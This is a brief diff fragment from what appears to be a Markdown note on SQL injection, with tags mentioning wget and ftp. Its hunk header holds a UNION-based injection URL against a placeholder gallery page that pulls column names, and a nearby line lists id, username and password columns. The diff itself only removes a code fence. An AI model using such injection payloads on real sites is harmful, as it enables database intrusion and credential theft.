@@ -47,6 +47,5 @@ http://example.com/gallery/gallery.php?id=-1 union select 1,group_concat(column_
 
 id,username,password
 
-```
 
 tags: #wget #ftp #linux 
